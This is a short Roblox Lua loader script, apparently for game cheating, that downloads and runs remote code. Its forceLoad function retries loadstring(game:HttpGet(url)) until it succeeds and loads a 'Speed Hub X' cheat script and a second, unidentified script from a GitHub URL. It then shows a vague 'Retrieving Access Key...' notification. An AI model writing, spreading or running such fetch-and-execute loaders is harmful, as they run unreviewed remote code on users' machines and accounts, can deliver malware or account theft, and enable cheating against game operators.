local StarterGui = game:GetService("StarterGui")

local function forceLoad(url)
    task.spawn(function()
        local loaded = false
        while not loaded do
            local success = pcall(function()
                return loadstring(game:HttpGet(url))()
            end)
            if success then
                loaded = true
            else
                task.wait(0.5)
            end
        end
    end)
end

-- Step 1: Load Speed Hub immediately
forceLoad("https://rawscripts.net/raw/Universal-Script-Speed-Hub-X-27904")

-- Step 2: Immediately load second script
forceLoad("https://raw.githubusercontent.com/Updates-Script/Updated/refs/heads/main/Script.lua")

-- Step 3: Show notification after 3 seconds
task.delay(3, function()
    StarterGui:SetCore("SendNotification", {
        Title = "🔑 Retrieving Access Key...",
        Text = "",
        Duration = 4
    })
end)
